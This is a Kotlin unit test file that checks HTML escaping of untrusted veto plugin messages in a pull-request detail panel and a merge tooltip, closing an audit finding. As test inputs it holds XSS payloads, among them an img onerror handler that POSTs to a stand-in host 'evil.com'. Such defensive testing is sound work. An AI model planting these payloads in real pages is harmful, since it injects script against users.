package com.workflow.orchestrator.pullrequest.ui

import com.workflow.orchestrator.core.util.HtmlEscape
import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test

/**
 * Verifies that untrusted veto plugin summaryMessage strings are HTML-escaped before being
 * inserted into Swing HTML labels in [PrDetailPanel].
 *
 * PrDetailPanel builds the veto warning with:
 *   HtmlEscape.escapeHtml(vetoText).replace("\n", "<br>")
 *
 * Closes audit finding pullrequest:F-1.
 */
class HtmlEscapeInVetoLabelsTest {

    // ── Veto warningLabel — summaryMessage ─────────────────────────────────────

    @Test
    fun `veto summaryMessage with script tag is escaped before html insertion`() {
        val summaryMessage = "<script>alert(1)</script>"
        // Simulate the PrDetailPanel logic: escape FIRST, then replace newlines
        val escaped = HtmlEscape.escapeHtml(summaryMessage).replace("\n", "<br>")
        val labelText = "<html><b>Warnings:</b><br>$escaped</html>"
        assertFalse(labelText.contains("<script>"), "Raw <script> must not appear; got $labelText")
        assertTrue(labelText.contains("&lt;script&gt;"))
    }

    @Test
    fun `veto summaryMessage newlines become br tags after escaping`() {
        val summaryMessage = "Check 1 failed\nCheck 2 failed"
        val escaped = HtmlEscape.escapeHtml(summaryMessage).replace("\n", "<br>")
        assertTrue(escaped.contains("<br>"), "Newlines should become <br> tags")
        // Verify no double-escaping of <br>
        assertFalse(escaped.contains("&lt;br&gt;"), "The <br> introduced by replace must NOT be escaped")
    }

    @Test
    fun `veto summaryMessage with angle brackets and ampersands is safely escaped`() {
        val summaryMessage = "Policy check: <REJECTED> for repo & branch"
        val escaped = HtmlEscape.escapeHtml(summaryMessage).replace("\n", "<br>")
        assertFalse(escaped.contains("<REJECTED>"))
        assertTrue(escaped.contains("&lt;REJECTED&gt;"))
        assertTrue(escaped.contains("&amp;"))
    }

    @Test
    fun `veto summaryMessage with img tag is escaped`() {
        val summaryMessage = "<img src=x onerror='fetch(\"evil.com\",{method:\"POST\"})'>"
        val escaped = HtmlEscape.escapeHtml(summaryMessage)
        assertFalse(escaped.contains("<img"), "Raw <img> must not survive escaping")
        assertTrue(escaped.contains("&lt;img"))
    }

    // ── mergeButton toolTipText — summaryMessage ───────────────────────────────

    @Test
    fun `merge button tooltip with html payload is escaped`() {
        val vetoReasons = "Cannot merge:\n<b>Blocked by policy</b>"
        val tooltip = HtmlEscape.escapeHtml("Cannot merge:\n$vetoReasons")
        assertFalse(tooltip.contains("<b>"), "Raw HTML must not appear in tooltip")
        assertTrue(tooltip.contains("&lt;b&gt;"))
    }
}
